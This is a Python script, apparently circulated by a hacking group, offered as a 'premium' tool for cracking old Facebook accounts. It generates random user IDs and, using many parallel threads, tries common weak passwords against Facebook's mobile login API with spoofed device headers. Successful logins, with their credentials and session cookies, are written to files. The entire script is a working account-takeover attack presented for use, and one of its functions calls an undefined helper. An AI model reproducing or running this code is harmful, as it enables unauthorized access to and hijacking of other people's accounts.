#======= SC SEND BY > KALYAN KING

#====== TELIGERM : KGF CYBER TEAM

#----------------------------[IMPORT/MODULE]-----------------------------------#
import os
import random
import sys
import subprocess
import time, uuid
from io import BytesIO

try:
    import requests
except ModuleNotFoundError:
    os.system("pip install requests")

try:
    import pycurl
except ModuleNotFoundError:
    os.system("pip install pycurl")

from concurrent.futures import ThreadPoolExecutor as ThreadPool
#-----------------------------[LINE]-----------------------------------#
def lin():
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
#-----------------------------[COLOR CODE]-----------------------------------#
r = "\x1b[1;31m"
g = "\x1b[1;32m"
b = "\x1b[1;34m"
p = "\x1b[1;35m"
m = "\x1b[1;36m"
w = "\x1b[1;37m"
loop = 0
oks = []
cps = []
ugen = []
rr=random.randint
rc=random.choice
#----------------------------[USER/AGENT]-----------------------------------#
def windows():
    best_build = random.randint(6000, 9000)
    patch = random.randint(100, 200)
    return (f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{best_build}.{patch} Safari/537.36")
#----------------------------[LOGO]-----------------------------------#
logo = f"""{g}
888888  dP"Yb  88   88 88b 88 8888b.  888888 88""Yb 
88__   dP   Yb 88   88 88Yb88  8I  Yb 88__   88__dP 
88""   Yb   dP Y8   8P 88 Y88  8I  dY 88""   88"Yb  
88      YbodP  `YbodP' 88  Y8 8888Y"  888888 88  Yb 
{p}━═━═══━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━━══━═━═━═━═━══{w}
TOOL OWNER    {r}:{w} FOUNDER
TOOL TYPE     {r}:{w} 2008-2015 ID CRACK {r}[{g}V1.0{r}]
TOOL STATUS   {r}:{w} \x1b[0;45mPREMIUM\x1b[0;91m{w}
YOUR KEY      {r}:{g} PRIVATE
SC SEND BY {r}:{g} KALYAN KING
{p}━═━═══━═━═━═━═━━═━═━══━═━═━═━═━━═━═━═━═━══━═━═━══━═━═"""
#----------------------------[MAIN/DEF]-----------------------------------#
def main():
    user = []
    os.system("clear")
    print(logo)
    print(f'{g}<{r}/{g}>{w} EXAMPLE   {r}: {w}10000 {g}| {w}20000 {g}| {w}90000')
    lin()    
    limit = input(f"{g}<{r}/{g}>{w} CHOICE    {r}: {g}")
    lin()    
    print(f"{g}[{r}1{g}] {w}SERVER {r}~ {g}[{w}2008{r}-{w}2009{g}]")
    print(f"{g}[{r}2{g}] {w}SERVER {r}~ {g}[{w}2010{r}-{w}2015{g}]")
    lin()   
    ask = input(f"{g}<{r}/{g}>{w} CHOICE    {r}: {g}")
    lin()   
    print(f"{g}[{r}1{g}] {w}METHOD {r}[{g}A{r}]")
    print(f"{g}[{r}2{g}] {w}METHOD {r}[{g}B{r}]{g}")
    lin() 
    mtd_opt = input(f"{g}<{r}/{g}>{w} CHOICE    {r}: {g}")
    lin()    
    print(f"{g}[{r}1{g}] {w} CRACK SPEED {r}[{g}HIGH{r}]")
    print(f"{g}[{r}2{g}] {w} CRACK SPEED {r}[{g}NORMAL{r}]{g}")
    lin()    
    cspd = input(f"{g}<{r}/{g}>{w} CHOICE    {r}: {g}")    
    if "1" in cspd:
        speedx = 45
    else:
        speedx = 30        
    if ask in ["1","02"]:
        sv = f"{g}[{w}2008{r}-{w}2009{g}]"
        for i in range(int(limit)):
            data = "1000000"+str(random.choice(range(11111111, 99999999)))
            user.append(data)
    elif ask in ["2", "02"]:
        sv = f"{g}[{w}2010{r}-{w}2015{g}]"
        for i in range(int(limit)):
            data = rc(["100001","100002","100003"])+str(random.choice(range(111111111, 999999999)))
            user.append(data)
    else:
        sv = f"{g}[{w}2008{r}-{w}2010{g}]"
        for i in range(int(limit)):
            data = random.choice(["10000001", "10000000"]) + str(random.choice(range(1111111, 9999999)))
            user.append(data)
    with ThreadPool(max_workers=speedx) as samira:
        tl = str(limit)
        os.system('clear')
        print(logo)
        print(f'{g}[{r}~{g}] {w}TOTAL ID {r}: {p}{limit} {g}[{r}~{g}] {w}SERVER {r}: {sv}')
        print(f'{g}[{r}~{g}] {w}IF NO RESULT {g}[{w}ON{r}/{w}OFF{g}]{w} AIRPLANE MODE{g}')
        lin()
        for mal in user:
            uid = mal
            if mtd_opt in ["1", "A"]:
                samira.submit(login1, uid, tl)
            elif mtd_opt in ["2", "B"]:
                samira.submit(login1, uid, tl)
            else:
                samira.submit(login2, uid, tl)
    print("")
    lin()
    print(f"{g}[{r}~{g}] {w}CRACK PROCESSED COMPLETED")
    print(f"{g}[{r}~{g}] {w}TOTAL OK ID : {g}{str(len(oks))}")
    lin()
    input(f"{g}[{r}~{g}] {w}PRESS ENTER TO EXIT")
    sys.exit()

def login1(uid, tl):
    global loop,oks,cps
    session = requests.session()    
    try:
        sys.stdout.write(f"\r➤ {g}{uid}{r}-{g}XD {r}[{g}{loop}{r}/{w}{tl}{r}] [{g}OK{r}/{g}{len(oks)}{r}]")
        sys.stdout.flush()        
        ua = windows()
        for pw in ('123456', '1234567', 'qwerty', 'password'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': ua,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login',data=data,headers=headers,allow_redirects=False).json()
            if 'session_key' in res:
                cookie = ";".join(i["name"] + "=" + i["value"] for i in res["session_cookies"])
                print(f"\r\r{g}SUCCESS {p}➤ {w}{uid} {r}|{w} {pw}")
                print(f"\r\r{g}{cookie}")
                open('/sdcard/2009-2015-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break           
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r\r{r}FAILED {p}➤ {w}{uid} {r}|{w} {pw}")
                open('/sdcard/2009-2015-CP.txt', 'a').write(f"{uid}|{pw}\n")
                cps.append(uid)
                break          
            else:
                continue
        loop += 1
    except Exception:
        time.sleep(5)

#----------------------------[METHOD 1]-----------------------------------#
def login2(uid, tl):
    global oks, cpe,  loop
    try:
        sys.stdout.write(f"\r➤ {g}JSON{r}-{g}XD {r}[{g}{loop}{r}/{w}{tl}{r}] [{g}OK{r}/{g}{len(oks)}{r}]")
        sys.stdout.flush()
        for pw in ["123456", "1234567", "12345678", "123456789", "123123", "000000", "asdfgh", "qwerty", "112233", "987654321"]:
            headers = {
                'x-fb-connection-bandwidth': str(random.randint(20000000, 40000000)),
                'x-fb-sim-hni': str(random.randint(20000, 40000)),
                'x-fb-net-hni': str(random.randint(20000, 40000)),
                'x-fb-connection-quality': 'EXCELLENT',
                'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                'user-agent': window1(),
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-http-engine': 'Liger'
            }
            url = ('https://b-api.facebook.com/method/auth.login?format=json&email=' +
                   str(uid) + '&password=' + str(pw) + 
                   '&credentials_type=device_based_login_password&generate_session_cookies=1' +
                   '&error_detail_type=button_with_disabled&source=device_based_login' +
                   '&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US' +
                   '&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.' +
                   'HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32' +
                   '&fb_api_req_friendly_name=authenticate&cpl=true')
            rp = requests.get(url, headers=headers).json()
            if "session_key" in rp:
                print(f"\r\r{g}SUCCESS {p}➤ {w}{uid} {r}|{w} {pw}")
                open("/sdcard/OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
                oks.append(uid)
                break 
            elif "Please Confirm Email" in str(rp):
                print(f"\r\r{g}SUCCESS {p}➤ {g}{uid} {r}|{g} {pw}")
                open("/sdcard/OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
                oks.append(uid)
                break
            else:
                continue
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(30)
    except Exception as e:
        pass
main()
#----------------------------[CODE/END]-----------------------------------#
